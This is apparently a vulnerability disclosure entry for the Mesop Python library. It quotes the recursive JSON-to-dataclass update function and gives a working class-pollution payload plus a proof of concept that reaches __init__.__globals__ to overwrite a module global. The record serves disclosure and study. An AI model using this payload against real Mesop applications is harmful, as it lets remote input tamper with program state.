## Mesop

### Meta

+ Library: Mesop
+ Stars: 5.7K
+ Version: v0.13.0
+ CVE: N/A
+ Status: Pending
+ Payload: ```mesop.dataclass_utils.dataclass_utils.update_dataclass_from_json(obj, '{"__init__": {"__globals__": {"__name__": "polluted"}}}')```
+ Foundby: BlackPyrl
+ Report: Pending
+ Type: App
+ Exploitability: High
+ Input: Remote

### Library

https://github.com/google/mesop

### Vulnerable Code Snippet

```
def _recursive_update_dataclass_from_json_obj(instance: Any, json_dict: Any):
  for key, value in json_dict.items():
    if hasattr(instance, key):
      attr = getattr(instance, key)
      if isinstance(value, dict):
        # If the value is a dict, recursively update the dataclass.
        setattr(
          instance,
          key,
          _recursive_update_dataclass_from_json_obj(attr, value),
        )
      elif isinstance(value, list):
        updated_list: list[Any] = []
        for item in cast(list[Any], value):
          if isinstance(item, dict):
            # If the json item value is an instance of dict
            # and the instance has an attribute with a matching name,
            # we assume the dict should be converted into a dataclass.
            attr = getattr(instance, key)
            item_instance = instance.__annotations__[key].__args__[0]()
            updated_list.append(
              _recursive_update_dataclass_from_json_obj(item_instance, item)
            )
          else:
            # If the item is not a dict, append it directly.
            updated_list.append(item)
        setattr(instance, key, updated_list)
      else:
        # For other types, set the value directly.
        setattr(instance, key, value)
    else:
      if isinstance(instance, dict):
        instance[key] = value
      else:
        raise MesopException(
          f"Unhandled stateclass deserialization where key={key}, value={value}, instance={instance}"
        )
  return instance
```
### PoC

```
from mesop.dataclass_utils.dataclass_utils import update_dataclass_from_json

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age

obj = Animal('cat', 11)

try:
    update_dataclass_from_json(obj, '{"__init__": {"__globals__": {"__name__": "polluted"}}}')
except:
    pass

print(__name__)
```